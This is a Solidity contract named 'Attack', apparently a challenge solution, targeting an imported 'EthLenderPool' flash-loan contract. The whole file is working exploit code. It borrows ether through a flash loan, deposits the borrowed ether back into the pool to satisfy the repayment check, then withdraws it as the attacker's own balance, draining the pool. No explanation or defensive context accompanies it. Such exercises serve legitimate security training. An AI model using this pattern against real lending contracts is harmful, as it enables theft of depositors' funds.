// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./EthLenderPool.sol";

contract Attack is IFlashLoanEtherReceiver {
    EthLenderPool pool;

    constructor(address _pool) {
        pool = EthLenderPool(_pool);
    }

    function attack(uint256 amount) public {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
